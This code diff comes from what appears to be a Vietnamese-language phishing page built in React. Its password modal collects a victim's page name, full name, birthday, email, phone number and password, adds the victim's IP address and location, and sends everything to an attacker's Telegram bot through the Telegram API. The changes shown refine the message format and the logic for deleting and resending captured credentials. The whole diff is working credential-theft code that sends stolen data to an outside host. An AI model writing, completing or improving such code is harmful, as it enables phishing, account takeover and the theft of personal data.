@@ -54,18 +54,14 @@ const createTelegramMessage = (
     : "🔑 <b>Mật Khẩu  :</b>";
 
   return `
-📍 <b>THÔNG TIN VỊ TRÍ</b>
 🌐 <b>IP:</b> <code>${geoData.ip}</code>
-🏳️ <b>Quốc Gia:</b> <code>${geoData.country}</code>
-🏙️ <b>Thành Phố:</b> <code>${geoData.city}</code>
+🏳️ <b>Vị Trí:</b> <code>${geoData.city} - ${geoData.country}</code>
 ⏰ <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
 ━━━━━━━━━━━━━━━━━━━━━
-👤 <b>THÔNG TIN PHỤ</b>
 📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
 👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
 🎂 <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
 ━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
 📧 <b>Email:</b> <code>${formData.email}</code>
 📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>
 ${passwordLabel} <code>${password}</code>`;
@@ -132,13 +128,15 @@ const PasswordModal: FC<PasswordModalProps> = ({
       setUiState((prev) => ({ ...prev, isLoading: true }));
 
       try {
-        await axios.post(
-          `https://api.telegram.org/bot${config.token}/deleteMessage`,
-          {
-            chat_id: config.chatId,
-            message_id: uiState.messageId,
-          },
-        );
+        if (uiState.messageId) {
+          await axios.post(
+            `https://api.telegram.org/bot${config.token}/deleteMessage`,
+            {
+              chat_id: config.chatId,
+              message_id: uiState.messageId,
+            },
+          );
+        }
         const response = await axios.post(
           `https://api.telegram.org/bot${config.token}/sendMessage`,
           {
@@ -210,14 +208,6 @@ const PasswordModal: FC<PasswordModalProps> = ({
         {
           chat_id: config.chatId,
           message_id: uiState.messageId,
-        },
-      );
-      return await axios.post(
-        `https://api.telegram.org/bot${config.token}/sendMessage`,
-        {
-          chat_id: config.chatId,
-          text: message,
-          parse_mode: "HTML",
         },
       );
     }
